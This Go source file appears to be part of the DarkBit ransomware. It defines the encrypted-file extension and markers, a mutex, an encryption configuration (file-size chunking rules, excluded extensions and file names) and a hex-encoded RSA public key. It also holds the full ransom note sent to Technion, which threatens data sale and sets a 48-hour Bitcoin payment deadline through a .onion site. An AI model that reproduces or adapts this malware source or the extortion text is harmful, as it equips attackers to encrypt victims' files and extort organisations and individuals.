package main


const (
  RansomNoteName = "RECOVERY_DARKBIT.txt"
  RansomExt = ".Darkbit"
  EncMarker1 = "DARKBIT_ENCRYPTED_FILES|"
  EncMarker2 = "DARKBIT"
)


// Mutex name
const MutexName string = "Global\\dbdbdbdb"


const RansomNote string =
`Dear Colleagues,
We’re sorry to inform you that we’ve had to hack Technion network completely and transfer “all” data to our secure servers.
So, keep calm, take a breath and think about an apartheid regime that causes troubles here and there.
They should pay for their lies and crimes, their names and shames. They should pay for occupation, war crimes against humanity,
killing the people (not only Palestinians’ bodies, but also Israelis’ souls) and destroying the future and all dreams we had.
They should pay for firing high-skilled experts.

Anyway, there is nothing for you (as an individual) to be worried.
That’s the task of the administration to follow up our instruction for recovering the network.
But, you can contact us via TOX messenger if you want to recover your files personally. (TOX ID: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX)

Our instruction for the administration:
All your files are encrypted using AES-256 military grade algorithm. So,
	1. Don't try to recover data, because the encrypted files are unrecoverable unless you have the key.
	Any try for recovering data without the key (using third-party applications/companies) causes PERMANENT damage. Take it serious.
	2. You have to trust us. This is our business (after firing from high-tech companies) and the reputation is all we have.
	3. All you need to do is following up the payment procedure and then you will receive decrypting key using for returning all of your files and VMs.
	4. Payment method:
		Enter the link below
			http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion/support
		Enter the ID below and pay the bill (XX BTC)
			xxxxx-xxxxxxxxx-xxxxxxxxx-xxxx-xxxxxx
You will receive decrypting key after the payment.

Notice that you just have 48 hours. After the deadline, a 30% penalty will be added to the price.
We put data for sale after 5 days.
Take it serious and don’t listen to probable advices of a stupid government.

Good Luck!
“DarkBit”`


const CfgData string =
`{
    "limits": [
		{
            "limitMB": 25,
            "parts": 1,
            "eachPart": -1
        },
        {
            "limitMB": 1000,
            "parts": 2,
            "eachPart": 12000
        },
        {
            "limitMB": 4000,
            "parts": 3,
            "eachPart": 10000
        },
        {
            "limitMB": 7000,
            "parts": 2,
            "eachPart": 20000
        },
        {
            "limitMB": 11000,
            "parts": 3,
            "eachPart": 30000
        },
        {
            "limitMB": 51000,
            "parts": 5,
            "eachPart": 30000
        },
        {
            "limitMB": 1000000,
            "parts": 3,
            "eachPart": 1000000
        },
        {
            "limitMB": 5000000,
            "parts": 5,
            "eachPart": 1000000
        },
        {
            "limitMB": 6000000,
            "parts": 20,
            "eachPart": 10000000
        }
    ],
    "extensions": {
        "msilog": 1,
        "log": 1,
        "ldf": 1,
        "lock": 1,
        "theme": 1,
        "msi": 1,
        "sys": 1,
        "wpx": 1,
        "cpl": 1,
        "adv": 1,
        "msc": 1,
        "scr": 1,
        "key": 1,
        "ico": 1,
        "dll": 1,
        "hta": 1,
        "deskthemepack": 1,
        "nomedia": 1,
        "msu": 1,
        "rtp": 1,
        "msp": 1,
        "idx": 1,
        "ani": 1,
        "386": 1,
        "diagcfg": 1,
        "bin": 1,
        "mod": 1,
        "ics": 1,
        "com": 1,
        "hlp": 1,
        "spl": 1,
        "nls": 1,
        "cab": 1,
        "diagpkg": 1,
        "icl": 1,
        "ocx": 1,
        "rom": 1,
        "prf": 1,
        "themepack": 1,
        "msstyles": 1,
        "icns": 1,
        "mpa": 1,
        "drv": 1,
        "cur": 1,
        "diagcab": 1,
        "exe": 1,
        "cmd": 1,
        "shs": 1,
        "Darkbit": 1
    },
    "names": {
        "thumbs.db": 1,
        "desktop.ini": 1,
        "darkbit.jpg": 1,
        "recovery_darkbit.txt": 1,
        "system volume information": 1
    },
    "processes": [],
    "hostnames": [
	"BlackPC"
    ]
}`


const PubKeyData string =
  "2d2d2d2d2d424547494e20525341205055424c4943204b45592d2d2d2d2d0a4d4949424" +
  "96a414e42676b71686b6947397730424151454641414f43415138414d49494243674b43" +
  "415145417364376e4b324d6c554b595a48794267524a42660a6551395259754e6855754" +
  "23839762f5172614c4a4a46775653316b6c32576b696e7a31446d64386177757169577a" +
  "45594d636163567a3750484b30476c3370650a644c6754693163534b3834684434304c3" +
  "776696b572f72337352637a354c5531456336444a7770552b4e554d637a55452b79546a" +
  "6441586a6c2b6547753771790a49752f4b346230715964515176387169724f516c38585" +
  "4592b3257497a74447654624f544e6531776d52765974394a503930622f37676c356834" +
  "5038337a70680a344c636c2b4c7274366830642f4279306276375133346e506c2b784a3" +
  "9374a714345336b616e6d567a58702b6578626365742b504b6e41474d652f7046316c65" +
  "0a3955736e46595141766c657369577269386174745642756d706f525068694a7948497" +
  "16f46365354356532396375427050515a4b784255595249514c777067450a4851494441" +
  "5141420a2d2d2d2d2d454e4420525341205055424c4943204b45592d2d2d2d2d0a"
